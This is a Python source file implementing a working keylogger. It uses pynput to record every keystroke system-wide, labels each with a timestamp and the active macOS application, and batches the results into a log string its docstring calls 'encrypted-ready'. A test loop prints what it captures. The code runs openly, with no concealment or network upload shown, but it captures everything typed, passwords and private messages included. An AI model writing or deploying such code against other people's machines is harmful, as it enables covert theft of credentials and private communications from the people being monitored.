from pynput import keyboard
import time
import threading
import subprocess
import platform
from datetime import datetime

def get_active_window():
    try:
        if platform.system() == "Darwin":
            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            return subprocess.check_output(["osascript", "-e", script]).decode().strip()
        else:
            return "Unknown"
    except:
        return "Unknown"

class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.key_counts = {}
        self.is_running = False
        self.lock = threading.Lock()
        self.listener = None
        self.current_window = "Unknown"
        self.window_thread = None
        self.start_time = None

    def _monitor_window(self):
        while self.is_running:
            self.current_window = get_active_window()
            time.sleep(1)

    def on_press(self, key):
        try:
            # Alphanumeric keys
            k = key.char
        except AttributeError:
            # Special keys
            k = str(key) # e.g. Key.space
        
        timestamp = datetime.now().isoformat()
        
        with self.lock:
            # Buffer now stores tuple
            self.buffer.append({
                "key": k,
                "timestamp": timestamp,
                "window": self.current_window
            })
            self.key_counts[str(k)] = self.key_counts.get(str(k), 0) + 1

    def start(self):
        if self.is_running:
            return
        
        self.is_running = True
        self.start_time = datetime.now()
        
        # Start Window Monitor
        self.window_thread = threading.Thread(target=self._monitor_window, daemon=True)
        self.window_thread.start()
        
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print("Keylogger started.")

    def stop(self):
        if not self.is_running:
            return
            
        self.is_running = False
        if self.listener:
            self.listener.stop()
        if self.window_thread:
            self.window_thread.join(timeout=1)
        print("Keylogger stopped.")

    def flush(self):
        """
        Returns the current buffer and clears it.
        Returns:
            content_str: Encrypted-ready string description
            summary: Dict with metadata (counts, top_window, duration)
        """
        with self.lock:
            if not self.buffer:
                return None, {}
            
            # Calculate duration
            now = datetime.now()
            duration = (now - self.start_time).total_seconds()
            self.start_time = now # Reset for next batch
            
            # Find dominant window in this batch
            windows = [x['window'] for x in self.buffer]
            if windows:
                top_window = max(set(windows), key=windows.count)
            else:
                top_window = "Unknown"

            # Create readable content string (for description)
            # Format: [Time][App] Key
            content_lines = []
            for item in self.buffer:
                content_lines.append(f"[{item['timestamp']}][{item['window']}] {item['key']}")
            content_str = "\n".join(content_lines)
            
            summary = {
                "key_counts": self.key_counts.copy(),
                "active_window": top_window,
                "duration_seconds": duration,
                "total_keystrokes": len(self.buffer)
            }
            
            self.buffer = []
            self.key_counts = {}
            return content_str, summary

if __name__ == "__main__":
    # Test
    kl = KeyLogger()
    kl.start()
    try:
        print("Type something... (Press Ctrl+C to stop)")
        while True:
            time.sleep(5)
            data = kl.flush()
            if data:
                print(f"Captured: {data}")
    except KeyboardInterrupt:
        kl.stop()
